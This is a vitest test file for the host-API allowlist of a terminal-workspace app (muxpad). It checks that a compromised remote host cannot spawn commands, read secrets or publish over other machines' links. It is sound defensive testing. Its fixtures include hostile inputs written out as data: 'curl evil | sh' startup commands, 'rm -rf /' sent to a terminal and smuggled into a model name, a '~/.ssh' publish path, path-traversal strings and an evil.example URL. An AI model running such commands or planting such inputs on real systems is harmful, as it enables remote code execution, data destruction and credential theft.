import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type Database from 'better-sqlite3';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { LOCAL_NODE_ID, NodeStore } from '../store/NodeStore.js';
import { PaneStore } from '../store/PaneStore.js';
import { TabStore } from '../store/TabStore.js';
import { WorkspaceStore } from '../store/WorkspaceStore.js';
import { openDb } from '../store/db.js';
import { HostApi } from './host-api.js';

/**
 * The surface a compromised host gets. Every `expect(404)` here is one of the
 * things the trust review priced: `startup_cmd` on a new pane, an app that
 * autostarts every boot, `/api/publish` with a path, typing into a live
 * terminal on the user's desk.
 */

let dir: string;
let db: Database.Database;
let fetched: Request[];
let api: HostApi;
let remote: { tab: string; paneId: string };
let local: { tab: string; paneId: string };

/** A fresh one per call — a Response body can only be read once. */
const ok = () =>
  new Response('{"ok":true}', { status: 200, headers: { 'content-type': 'application/json' } });

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'muxpad-hostapi-'));
  db = openDb(join(dir, 'db.sqlite'));
  const nodes = new NodeStore(db);
  nodes.add({ id: 'trayo', name: 'VM', endpoint: 'ws://vm:7797' });
  const ws = new WorkspaceStore(db).create({ name: 'W' }).id;
  const mk = (nodeId: string) => {
    const tab = new TabStore(db).create({ name: 'T', layout: '', workspace_id: ws }).id;
    const paneId = new PaneStore(db).create({ tab_id: tab, shell: '/bin/zsh', cwd: '/tmp' }).id;
    db.prepare('UPDATE panes SET node_id = ? WHERE id = ?').run(nodeId, paneId);
    return { tab, paneId };
  };
  remote = mk('trayo');
  local = mk(LOCAL_NODE_ID);
  fetched = [];
  api = new HostApi({
    db,
    selfUrl: 'http://127.0.0.1:7777',
    apiKey: () => 'secret',
    fetch: (req) => {
      fetched.push(req);
      return ok();
    },
  });
});
afterEach(() => {
  db.close();
  rmSync(dir, { recursive: true, force: true });
});

describe('what a host may ask for', () => {
  it('passes a card write for its OWN chat', async () => {
    const res = await api.handle(
      'trayo',
      'PUT',
      `/api/tabs/${remote.tab}/cards/build`,
      '{"text":"x"}',
    );
    expect(res.status).toBe(200);
    expect(fetched).toHaveLength(1);
    const req = fetched[0] as Request;
    expect(new URL(req.url).pathname).toBe(`/api/tabs/${remote.tab}/cards/build`);
    // Headers are OURS: the install credential and a same-origin Origin,
    // nothing the host sent.
    expect(req.headers.get('x-muxpad-key')).toBe('secret');
    expect(req.headers.get('origin')).toBe('http://127.0.0.1:7777');
  });

  it('passes `agent send` to a pane on its own machine', async () => {
    const res = await api.handle(
      'trayo',
      'POST',
      `/api/agent-sessions/${remote.paneId}/send`,
      '{"text":"hi"}',
    );
    expect(res.status).toBe(200);
  });

  it('issues the say key, which carries no id to scope', async () => {
    expect((await api.handle('trayo', 'GET', '/api/say/key')).status).toBe(200);
  });
});

describe('what it may not', () => {
  const refused = async (method: string, path: string, body?: string) => {
    const res = await api.handle('trayo', method, path, body);
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  };

  it('refuses another machine’s chat — the host-scoping rule, enforced', () =>
    refused('PUT', `/api/tabs/${local.tab}/cards/build`, '{"text":"x"}'));

  it('refuses `agent send` to a pane on the mac', () =>
    refused('POST', `/api/agent-sessions/${local.paneId}/send`, '{"text":"hi"}'));

  it('refuses a pane it has never heard of — unknown is not ours', () =>
    refused('POST', '/api/agent-sessions/pGhost/send', '{"text":"hi"}'));

  it('refuses a pane that spawns a command', () =>
    refused('POST', `/api/tabs/${remote.tab}/panes`, '{"startup_cmd":"curl evil|sh"}'));

  it('refuses an app that would autostart every boot', () =>
    refused('POST', '/api/apps', '{"command":"evil"}'));

  it('refuses publishing a path', () => refused('POST', '/api/publish', '{"path":"~/.ssh"}'));

  it('refuses typing into a terminal', () =>
    refused('POST', `/api/panes/${local.paneId}/input`, '{"data":"rm -rf /\\n"}'));

  it('refuses a cron that survives reboots', () => refused('POST', '/api/crons', '{}'));

  it('refuses the index page, which hands out the install secret in a cookie', () =>
    refused('GET', '/'));

  it('refuses traversal dressed as a card name', () =>
    refused('PUT', `/api/tabs/${remote.tab}/cards/..%2F..%2Fapps`, '{}'));

  it('refuses a query string on an allowed shape, rather than passing it on', () =>
    refused('GET', '/api/say/key?x=1'));

  it('refuses a host calling itself `local`', async () => {
    const res = await api.handle('local', 'GET', '/api/say/key');
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });
});

describe('the path that is dispatched', () => {
  it('is rebuilt from validated captures, not taken from the host', async () => {
    // A trailing-encoded separator that `exec` tolerates must not survive.
    await api.handle('trayo', 'GET', `/api/tabs/${remote.tab}/cards/mar%6Bet`);
    const req = fetched[0] as Request;
    // Decoded once, then rebuilt — so the router sees a plain name.
    expect(new URL(req.url).pathname).toBe(`/api/tabs/${remote.tab}/cards/market`);
  });

  it('reports a refusal identically whatever was asked, so nothing is probed', async () => {
    const a = await api.handle('trayo', 'POST', '/api/apps', '{}');
    const b = await api.handle('trayo', 'GET', `/api/tabs/${local.tab}/cards`);
    expect(a).toEqual(b);
  });
});

describe('spawning a worker', () => {
  it('is allowed from one of its OWN chats, pinned to its own machine', async () => {
    const res = await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({
        bootstrap: 'agent',
        spawned_by_pane: remote.paneId,
        backend: 'claude',
        mode: 'chat',
        name: 'read the build log',
        cwd: '/home/ohad/work',
      }),
    );
    expect(res.status).toBe(200);
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.node_id).toBe('trayo');
    expect(sent.spawned_by_pane).toBe(remote.paneId);
    expect(sent.bootstrap).toBe('agent');
    expect(sent.cwd).toBe('/home/ohad/work');
  });

  it('is refused with no parent — the parent IS the authorisation', async () => {
    const res = await api.handle('trayo', 'POST', '/api/tabs', JSON.stringify({ cwd: '/tmp' }));
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });

  it('is refused when the parent is a chat on the mac', async () => {
    // Otherwise a host names someone else's chat and gets a worker on this
    // machine, in that conversation's own tree.
    const res = await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({ spawned_by_pane: local.paneId }),
    );
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });

  it('drops every field it does not know, today or after someone extends the route', async () => {
    await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({
        spawned_by_pane: remote.paneId,
        startup_cmd: 'curl evil | sh',
        workspace_id: 'w-somewhere-else',
        layout: { kind: 'leaf' },
        icon: '💀',
      }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.startup_cmd).toBeUndefined();
    expect(sent.workspace_id).toBeUndefined();
    expect(sent.layout).toBeUndefined();
    expect(sent.icon).toBeUndefined();
  });

  it('refuses a model that could carry shell syntax, rather than passing it', async () => {
    await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({ spawned_by_pane: remote.paneId, model: 'opus; rm -rf /' }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.model).toBeUndefined();
  });

  it('refuses a relative cwd — that is not a directory on any machine', async () => {
    await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({ spawned_by_pane: remote.paneId, cwd: '../../etc' }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.cwd).toBeUndefined();
  });

  it('lets the host read back the tab it just made, to address the worker', async () => {
    const res = await api.handle('trayo', 'GET', `/api/tabs/${remote.tab}`);
    expect(res.status).toBe(200);
  });

  it('sees only ITS OWN panes in a mixed tab', async () => {
    // `tabIsOn` accepts a tab containing ANY pane on the calling host — the
    // right rule for a card, which belongs to the conversation, and the wrong
    // one for this answer, which carries every pane's `env`, `startup_cmd`
    // and `cwd`. Tabs CAN be mixed: merge preserves each pane's node. So a
    // host with one pane in a merged tab could read a local pane's
    // environment by asking about the tab they share. Found in review.
    const mixed = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => 'secret',
      fetch: () =>
        new Response(
          JSON.stringify({
            id: remote.tab,
            panes: [
              { id: remote.paneId, env: null },
              { id: local.paneId, env: { API_TOKEN: 'secret' }, startup_cmd: 'deploy --prod' },
            ],
          }),
          { status: 200, headers: { 'content-type': 'application/json' } },
        ),
    });
    const res = await mixed.handle('trayo', 'GET', `/api/tabs/${remote.tab}`);
    expect(res.status).toBe(200);
    const body = JSON.parse(res.body) as { panes: Array<{ id: string }> };
    expect(body.panes.map((p) => p.id)).toEqual([remote.paneId]);
    expect(res.body).not.toContain('API_TOKEN');
    expect(res.body).not.toContain('deploy --prod');
  });

  it('refuses reading a tab on the mac', async () => {
    const res = await api.handle('trayo', 'GET', `/api/tabs/${local.tab}`);
    expect(res.status).toBe(404);
  });
});

describe('publishing from a host', () => {
  const withFetch = (
    impl: (
      nodeId: string,
      path: string,
    ) => Promise<{ path: string; dispose: () => void } | { error: string }>,
  ) => {
    const disposed: string[] = [];
    const a = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => 'secret',
      fetch: (req) => {
        fetched.push(req);
        return ok();
      },
      fetchFromHost: impl,
      // Permissive by default here; the ownership rule has its own tests
      // below and every other publish test is about the body it builds.
      mayPublishAs: () => true,
    });
    return { a, disposed };
  };

  it('publishes the STAGED path, never the host’s', async () => {
    let askedFor = '';
    const { a } = withFetch(async (_n, p) => {
      askedFor = p;
      return { path: '/Users/ohadpr/.muxpad/host-staging/x/report.html', dispose: () => {} };
    });
    const res = await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/home/ohad/work/report.html', name: 'weekly' }),
    );
    expect(res.status).toBe(200);
    // The host's path names what to FETCH and reaches publish not at all —
    // the route's filesystem reasoning (is this the public dir, is it an
    // ancestor of it) cannot usefully stat another machine's path.
    expect(askedFor).toBe('/home/ohad/work/report.html');
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.path).toBe('/Users/ohadpr/.muxpad/host-staging/x/report.html');
    expect(sent.name).toBe('weekly');
  });

  it('deletes the staging tree whatever publish did', async () => {
    let gone = false;
    const { a } = withFetch(async () => ({
      path: '/tmp/staged',
      dispose: () => {
        gone = true;
      },
    }));
    await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/home/ohad/x' }));
    expect(gone).toBe(true);
  });

  it('drops a base url the host suggested, so the link is the durable one', async () => {
    const { a } = withFetch(async () => ({ path: '/tmp/staged', dispose: () => {} }));
    await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/home/ohad/x', public_base_url: 'https://evil.example' }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.public_base_url).toBeUndefined();
  });

  it('refuses a relative path without asking the host for anything', async () => {
    let asked = false;
    const { a } = withFetch(async () => {
      asked = true;
      return { error: 'x' };
    });
    const res = await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: 'rel' }));
    expect(res.status).toBe(404);
    expect(asked).toBe(false);
  });

  it('reports a failed transfer as 502, not as a publish that worked', async () => {
    const { a } = withFetch(async () => ({ error: 'that machine is not connected' }));
    const res = await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/x' }));
    expect(res.status).toBe(502);
    expect(res.body).toContain('not connected');
    expect(fetched).toHaveLength(0);
  });

  it('answers the pre-flight, so the CLI never goes looking for tailscale', async () => {
    // A 404 here reads as "unanswered", and the CLI's ladder for that ends in
    // execing tailscale to create a funnel mapping — on a machine with no
    // business doing it. A publish from the VM hung past two minutes there
    // while the artifact itself had already transferred fine.
    const res = await api.handle('trayo', 'GET', '/api/publish/base?probe=0');
    expect(res.status).toBe(200);
    expect(new URL((fetched[0] as Request).url).search).toBe('?probe=0');
  });

  it('still refuses a query the shape did not name', async () => {
    const res = await api.handle('trayo', 'GET', '/api/publish/base?probe=1');
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });

  /**
   * A NAME IS A CLAIM ON AN EXISTING PUBLIC URL.
   *
   * `--name` is republish-in-place: the slug resolves against the install's
   * whole public directory and the old tree rotates to `@2`. A host naming an
   * artifact it does not own therefore REPLACES that artifact at the link
   * somebody has already shared, with no `update: true` required.
   */
  it('refuses a name another machine published, and asks nobody to fetch', async () => {
    let asked = false;
    const a = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => 'secret',
      fetch: (req) => {
        fetched.push(req);
        return ok();
      },
      fetchFromHost: async () => {
        asked = true;
        return { error: 'x' };
      },
      mayPublishAs: () => false,
    });
    const res = await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/home/ohad/x', name: 'personal-report' }),
    );
    expect(res.status).toBe(403);
    expect(res.body).toContain('another machine');
    // Nothing transferred and nothing published — refused before the fetch.
    expect(asked).toBe(false);
    expect(fetched).toHaveLength(0);
  });

  it('re-checks ownership AFTER the transfer, because the host holds the clock', async () => {
    // Time-of-check to time-of-use. The check runs before `fetchFromHost`,
    // and the host controls how long that takes — up to the two-minute
    // timeout. A review found the window: ask for a name that is unused (so
    // the check passes), stall the transfer, let the mac publish that name
    // meanwhile, then finish sending. The publish route resolves the name
    // again and replaces the mac's fresh artifact at the url it has just
    // handed out.
    let calls = 0;
    const a = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => 'secret',
      fetch: (req) => {
        fetched.push(req);
        return ok();
      },
      // The transfer "succeeds" — the race is about what happened during it.
      fetchFromHost: async () => ({ path: '/tmp/staged', dispose: () => {} }),
      // Free when asked before the transfer, taken when asked after.
      mayPublishAs: () => ++calls === 1,
    });
    const res = await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/home/ohad/x', name: 'report' }),
    );
    expect(calls).toBe(2);
    expect(res.status).toBe(403);
    expect(res.body).toContain('while this transfer ran');
    // …and nothing was published.
    expect(fetched).toHaveLength(0);
  });

  it('refuses a name when the server was wired without the check', async () => {
    // Absent `mayPublishAs` means NO host may name an artifact: the safe
    // default for a half-wired server rather than the permissive one.
    const a = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => null,
      fetch: () => ok(),
      fetchFromHost: async () => ({ path: '/tmp/x', dispose: () => {} }),
    });
    const res = await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/x', name: 'anything' }),
    );
    expect(res.status).toBe(403);
  });

  it('still allows an UNNAMED publish, which takes nothing from anybody', async () => {
    const { a } = withFetch(async () => ({ path: '/tmp/staged', dispose: () => {} }));
    const res = await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/x' }));
    expect(res.status).toBe(200);
  });

  it('is refused outright when the link has no file channel', async () => {
    // `fetchFromHost` absent = publishing from a host is simply not on the
    // list, which is the right default rather than a half-working path.
    const res = await api.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/x' }));
    expect(res.status).toBe(404);
  });
});

describe('a router that throws', () => {
  // The rejection is deliberate: HostLink.answerApi is the one place that
  // turns it into a 500, because that is also where "no handler at all" has to
  // become a refusal. Swallowing it here would hide a server bug as a 500 with
  // no log line.
  it('rejects, for HostLink to turn into a refusal the pane can see', async () => {
    const boom = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => null,
      fetch: vi.fn(() => {
        throw new Error('nope');
      }),
    });
    await expect(boom.handle('trayo', 'GET', '/api/say/key')).rejects.toThrow('nope');
  });
});

/**
 * SLACK, FROM THE MACHINE SLACK IS SCOPED TO.
 *
 * The policy says Slack belongs to the Trayo VM. This allowlist had no
 * `/api/slack` shape at all, so the one machine allowed to use Slack was the
 * one machine that could not reach it: `muxpad slack channels` on the VM died
 * with an empty error, twice. The policy and the transport contradicted each
 * other, and neither said so.
 *
 * The caller identity travels in the QUERY for these routes, which the path
 * rebuild deliberately throws away — so the query is rebuilt too, under the
 * same discipline: parsed, checked, and a new string built from two values.
 */
describe('slack reaches the host it is scoped to', () => {
  it('passes a channel list for one of its OWN panes, with the query rebuilt', async () => {
    const res = await api.handle(
      'trayo',
      'GET',
      `/api/slack/channels?pane=${remote.paneId}&key=abc123`,
    );
    expect(res.status).toBe(200);
    const url = new URL((fetched[0] as Request).url);
    expect(url.pathname).toBe('/api/slack/channels');
    // Rebuilt in a FIXED ORDER from two validated values — not the host's
    // string passed along.
    expect(url.search).toBe(`?pane=${remote.paneId}&key=abc123`);
  });

  it('refuses a pane that is not this host’s — the whole point of the allowlist', async () => {
    const res = await api.handle(
      'trayo',
      'GET',
      `/api/slack/channels?pane=${local.paneId}&key=abc123`,
    );
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });

  it('refuses a query that is missing, malformed, or carrying extras', async () => {
    for (const q of [
      '',
      '?pane=',
      `?pane=${remote.paneId}`,
      '?key=abc123',
      '?pane=../../etc&key=abc',
      `?pane=${remote.paneId}&key=${'x'.repeat(300)}`,
    ]) {
      const res = await api.handle('trayo', 'GET', `/api/slack/channels${q}`);
      expect(res.status, q).toBe(404);
    }
    expect(fetched).toHaveLength(0);
  });

  it('drops anything extra the host put in the query', async () => {
    // A third parameter is not an error to strip silently — it is simply not
    // rebuilt, because the rebuild names what may travel.
    await api.handle(
      'trayo',
      'GET',
      `/api/slack/channels?pane=${remote.paneId}&key=abc123&as=admin&scope=all`,
    );
    const url = new URL((fetched[0] as Request).url);
    expect(url.search).toBe(`?pane=${remote.paneId}&key=abc123`);
    expect(url.search).not.toContain('admin');
  });

  it('passes the approval poll, which is the other half of one call', async () => {
    const res = await api.handle(
      'trayo',
      'GET',
      `/api/slack/requests/0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d?pane=${remote.paneId}&key=k`,
    );
    expect(res.status).toBe(200);
    expect(new URL((fetched[0] as Request).url).pathname).toBe(
      '/api/slack/requests/0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d',
    );
  });

  it('still refuses a WRITE — those are a separate decision', async () => {
    // Reads and the approval poll only. Six write verbs with six bodies to
    // rebuild, added untested in one go, is how an allowlist stops being one.
    for (const [method, path] of [
      ['POST', '/api/slack/post'],
      ['POST', '/api/slack/dm'],
      ['POST', '/api/slack/upload'],
    ] as const) {
      const res = await api.handle('trayo', method, `${path}?pane=${remote.paneId}&key=k`);
      expect(res.status, path).toBe(404);
    }
    expect(fetched).toHaveLength(0);
  });
});
